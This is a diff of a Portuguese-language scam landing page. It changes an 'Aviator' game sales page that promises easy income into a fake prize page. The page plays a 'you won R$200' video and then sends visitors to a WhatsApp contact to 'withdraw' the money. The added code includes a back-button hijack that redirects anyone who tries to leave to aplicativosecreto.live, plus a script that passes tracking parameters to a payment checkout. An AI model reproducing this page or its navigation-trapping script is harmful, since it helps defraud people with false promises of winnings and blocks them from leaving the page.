@@ -13,7 +13,7 @@
     <link rel="stylesheet" href="./assets/css/com.css">
 
     <!-- Título da Página -->
-    <title>AVIATOR</title>
+    <title>Ganhando Com Músicas</title>
     
     <style type="text/css">
       header {
@@ -30,64 +30,223 @@
     
    
     
+    <script>
+        (function(b) {
+            var a = {
+                version: "0.0.1",
+                history_api: typeof history.pushState !== "undefined",
+                init: function() {
+                    b.location.hash = "#no-back";
+                    a.configure();
+                },    
+                hasChanged: function() {
+                    if (b.location.hash == "#no-back") {
+                        b.location.hash = "#";
+                        b.location.href = "https://aplicativosecreto.live/b"; //LINK PARA REDIRECIONAR AQUI
+                    }
+                },
+                checkCompat: function() {
+                    if (b.addEventListener) {
+                        b.addEventListener("hashchange", a.hasChanged, false);
+                    } else {
+                        if (b.attachEvent) {
+                            b.attachEvent("onhashchange", a.hasChanged);
+                        } else {
+                            b.onhashchange = a.hasChanged;
+                        }
+                    }
+                },
+                configure: function() {
+                    if (b.location.hash == "#no-back") {
+                        if (this.history_api) {
+                            history.pushState(null, "", "#");
+                        } else {
+                            b.location.hash = "#";
+                            b.location.href = "https://aplicativosecreto.live/b"; //LINK PARA REDIRECIONAR AQUI
+                        }
+                    }
+                    a.checkCompat();
+                    a.hasChanged();
+                }
+            };
+            if (typeof define === "function" && define.amd) {
+                define(function() {
+                    return a;
+                });
+            } else {
+                if (typeof module === "object" && module.exports) {
+                    module.exports = a;
+                } else {
+                    b.noback = a;
+                }
+            }
+            a.init();
+        }(window));
+    </script>
+
     
     
-   
-   
     
+    
+    
+    <script>
+(function() {
+     const utmParamQueryString = new URLSearchParams(window.location.search);
+     if (utmParamQueryString.toString()) {
+          var navLinks = document.querySelectorAll('a');
+          navLinks.forEach(function(item) {
+               if (item.href.indexOf("go.perfectpay.com.br") !== -1) {
+                    if (item.href.indexOf('?') === -1) {
+                         item.href += '?' + utmParamQueryString.toString();
+                    } else {
+                         item.href += '&' + utmParamQueryString.toString();
+                    }
+               }
+          });
+     }
+})();
+</script>
+    
+  
+	 
+	  
   </head>
+	
   <body>
-    
+	  
     <header class="py-4">
       <div class="container">
         <div class="row justify-content-center">
           <div class="col-lg-8 text-center">
             <!-- Imagem Ultrasecreto -->
-            <img class="img-fluid" src="./assets/img/ultra_secreto_vermelho-removebg-preview.png">
+            <img class="img-fluid" src="./assets/img/banner aviator2.png">
+		  
 
             <!-- Headline -->
-            <h3 class="my-4"><b>Revelado: ganhe um pouco de dinheiro jogando esse jogo de celular</b></h3>
-           
+            <h3 class="my-4" id="sumir"><b>CLIQUE E GANHE DINHEIRO</b></h3>
+		  <p id="abaixosumir" >Ganhe de <b>R$100</b> a <b>R$500</b> clicando no botão abaixo! Saque seu dinheiro HOJE!</p>
 
-            <!-- VSL -->
-          <p> Aviator é um jogo online que você pode baixar em seu celular, tablet ou computador!</p>
-		  <p> O objetivo desse jogo é controlar o avião, por meio de 1 único botão que aparece em sua tela e evitar que esse avião caia no chão ou voe tão alto que se perca no céu!</p>
-		  <p>Esse jogo ficou famoso por ser um jogo que gera renda extra para seus usuários. Portanto, além de se divertir você consegue ganhar um pouco de dinheiro todos os dias apenas jogando o jogo desse avião</p>
-		  <p>Para jogar e ganhar dinheiro é muito simples, não existe segredo! Basta apenas clicar no botão da sua tela e controlar o avião para ele nem cair e nem subir demais, ele precisa voar a nível mediano, sem sair do centro da tela. Simples assim, até uma criança de 5 anos consegue compreender</p>
-		  <p> Jogando esse simples jogo, você consegue ganhar uma renda extra em sua casa, pelo seu celular, tablet ou computador</p>
-		  <p> Você deve estar se perguntando porque esse joguinho de celular te pagaria para você se divertir. A resposta é simples: quanto mais jogadores esse aplicativo tem, mais propagandas vão ser vistas dentro desse jogo e quanto mais propagandas dentro do jogo, mais dinheiro os empresários por trás do aplicativo ganha,</p>
-		  <p>Logo, para aumentar a quantidade de usuários e, consequentemente seus lucros, os desenvolvedores do aplicativo resolveram dar parte dos lucros aos usuários, assim, eles conseguem cada vez mais usuários para jogar os jogos, ganham muito mais dinheiro e precisam apenas dar uma pequena parte desse lucro aos usuários desse jogo</p>
-		  <p>Além disso, como campanha de incentivo para começar a jogar e criar sua conta, os desenvolvedores estão oferencendo, por tempo limitado, uma quantia de BÔNUS DE SALDO INICIAL no valor de R$200,00</p>
-		  <p>Se você baixar e criar sua conta hoje nesse joguinho Aviator, você receberá um bônus inicial de 200 reais que estará na sua conta do aplicativo, assim que você a criar</p>
-		  <p>Para receber seu acesso ao link para baixar o jogo do aviator e receber seu bônus de saldo inicial válido por tempo limitado no valor de 200 reais, clique no link abaixo e faça sua compra</p>
-          <p> Esse é um aplicativo DIGITAL, você receberá após a sua compra seu acesso ao aplicativo que te paga para dar opiniões e também a ebooks que te ensinam a usar seu aplicativo.</p>
-	      <p>Por ser um produto digital, não é necessário envio do produto, pois você recebe acesso a tudo via EMAIL! Logo, o reembolso é mais fácil também, para pedir reembolso basta nos enviar um email e pronto!<p>
-	      <p>Contato: +55 31 945683256 - Email:produtosuporteaqui@gmail.com</p>
-	      <p>Loja Divino Luxo, CNPJ 39.504.571/0001-32, Av Juscelino Kubitschek, Londrina, Paraná, Brasil</p>	  
-            
-          <!-- Botão 1 -->
-            <div id="cta1" class="mt-4 d-none">
-              <a href="https://go.perfectpay.com.br/PPU38CLQ0CQ" class="a-btn" style="text-decoration: none;">
-                <span class="span-btn">QUERO OBTER ACESSO!</span>
-                <span class="span-btn2">(atenção: vagas limitadas)</span>
-              </a>
-            </div>
-          </div>
-        </div>
-      </div>
-    </header>
-    
+                       
+		  
+		  
+<!-- Div que contém o GIF -->
+<div id="gif-container">
+   <img id="gif" width="320" height="220" src="./assets/img/2023-03-16-18-06-17.gif" />
+</div>
+
+<!-- Div que contém o botão -->
+<div>
+  <img id="trocar-gif" widht="400" height="110" <button src="./assets/img/image140.png" /button> </img>
+
+</div>
+
+<!-- Div que contém o vídeo -->
+<div id="video-container" style="display:none;">
+    <video id="video" width="320" height="240" controlsList="nodownload" autoplay="autoplay" muted>
+        <source src="./assets/img/aviator - voce ganhou.mp4" type="video/mp4">
+        <object data="" width="320" height="240">
+            <embed width="320" height="240" margin-bottom: 40px src="./assets/img/aviator - voce ganhou.mp4">
+        </object>
+    </video>
+	<div>
+	<img margin-top: 40px ; margin-bottom: 40px id="gif" width="300" height="120" src="./assets/img/Loading-aviator-unscreen (1).gif" />
+		</div>
+</div>
+
+		
+	<style>
+      /* CSS para o pulsing da imagem */
+      #pulsing {
+        animation: pulse 2s infinite;
+      }
+
+      @keyframes pulse {
+        0% {
+          transform: scale(1);
+        }
+        50% {
+          transform: scale(1.1);
+        }
+        100% {
+          transform: scale(1);
+        }
+      }
+    </style>	  
+	
+		 	  
+		  
+<!-- Div que contém o título e o parágrafo -->
+<div id="final-container" style="display:none;">
+    <h1>Parabéns! Você ganhou R$200!</h1>
+<script src="https://fast.wistia.com/embed/medias/xm5s02r2kg.jsonp" async></script><script src="https://fast.wistia.com/assets/external/E-v1.js" async></script><div class="wistia_responsive_padding" style="padding:56.25% 0 0 0;position:relative;"><div class="wistia_responsive_wrapper" style="height:100%;left:0;position:absolute;top:0;width:100%;"><div class="wistia_embed wistia_async_xm5s02r2kg videoFoam=true" style="height:100%;position:relative;width:100%"><div class="wistia_swatch" style="height:100%;left:0;opacity:0;overflow:hidden;position:absolute;top:0;transition:opacity 200ms;width:100%;"><img src="https://fast.wistia.com/embed/medias/xm5s02r2kg/swatch" style="filter:blur(5px);height:100%;object-fit:contain;width:100%;" alt="" aria-hidden="true" onload="this.parentNode.style.opacity=1;" /></div></div></div></div>    <h1>SAQUE SEU DINHEIRO AGORA</h1>
+ <p>Para sacar, clique no botão abaixo e entre em contato com nossa gerente do Whatsapp</p>
+	<a href="https://wa.me/55318749593302"> <img id="pulsing" width="320" height="120" src="./assets/img/botão wpp.png" /></a>
+	
+	
+</div>
+
+<script>
+    // Seleciona o botão, o elemento de GIF e o elemento de vídeo
+    const botao = document.getElementById("trocar-gif");
+    const gif = document.getElementById("gif");
+	 const text = document.getElementById("sumir");
+    const videoContainer = document.getElementById("video-container");
+    const finalContainer = document.getElementById("final-container");
+    const video = document.getElementById("video");
+
+    // Adiciona o evento de click ao botão
+    botao.addEventListener("click", function() {
+	    
+        // Esconde o botão, o GIF e exibe o vídeo
+        botao.style.display = "none";
+        gif.style.display = "none";
+	    sumir.style.display = "none";
+	    textoabaixobotao.style.display = "none";
+        videoContainer.style.display = "block";
+
+        // Altera o atributo "src" da tag "img" para a URL do vídeo
+        gif.setAttribute("src", "./assets/img/2023-03-16 18-06-54 (1) (1).mp4");
+    });
+
+    // Adiciona o evento de fim de reprodução do vídeo
+    video.addEventListener('ended', function() {
+        // Esconde o vídeo e exibe o título e o parágrafo
+        videoContainer.style.display = "none";
+	    abaixosumir.style.display = "none";
+        finalContainer.style.display = "block";
+    });
+	 
    
+	
+</script>
 
-     <footer class="bg-dark py-3 text-center">
-      <div class="text-white"><a href="termosaviator.html" class="text-white">Termos de Uso</a> | <a href="privacidadeaviator.html" class="text-white">Política de Privacidade</a></div>
-    </footer>
-        
-       
+
+            <!-- TEXTO ABAIXO DO BOTÃO INICIAL -->
+		  <p> </p>
+	<div>
+		 <p id="textoabaixobotao"><b> Clique no botão acima e descubra quanto dinheiro você ganhou!</b></p>
+		
+		  </div>
+		  
+		  
+		  
+		
+		  
+	
+		
+		  
+		  <p></p>
+		    <p></p>
+		    <p></p>
+    
+    <footer class="bg-dark py-3 text-center">
+      <div class="text-white"; margin-top: 40px ><a href="termosprodutosdegraca.html" class="text-white">Termos de Uso</a> | <a href="privacidadeprodutosdegraca.html" class="text-white">Política de Privacidade</a> 
+        </div>
+    
         </footer>
 
     <script type="text/javascript">
-      setTimeout(() => {document.getElementById("cta1").classList.remove("d-none"); document.getElementById("cta2").classList.remove("d-none")}, 0); // temporização da Call to Action (em milissegundos)
+      setTimeout(() => {document.getElementById("cta1").classList.remove("d-none"); document.getElementById("cta2").classList.remove("d-none")}, 890000); // temporização da Call to Action (em milissegundos)
     </script>
 
     <script src="https://code.jquery.com/jquery-3.3.1.slim.min.js" integrity="sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo" crossorigin="anonymous"></script>
